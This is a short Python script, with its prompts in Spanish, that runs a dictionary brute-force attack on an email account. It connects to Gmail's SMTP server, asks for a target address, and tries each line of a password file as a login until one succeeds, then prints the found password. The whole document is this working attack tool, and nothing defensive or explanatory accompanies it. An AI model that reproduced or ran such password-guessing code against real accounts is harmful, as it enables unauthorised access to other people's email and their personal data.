import smtplib

smtserver=smtplib.SMTP("smtp.gmail.com", 587)
smtserver.ehlo()
smtserver.starttls()

print("\n")

email=input("inserte el email: ")

dic=open("./diccionario.txt", "r")

for pwd in dic:
    try:
        smtserver.login(email, pwd)
        print("contraseña correcta : ",pwd )
        break
    except smtplib.SMTPAuthenticationError:
        print("Contraseña incorrect: ",pwd )

    
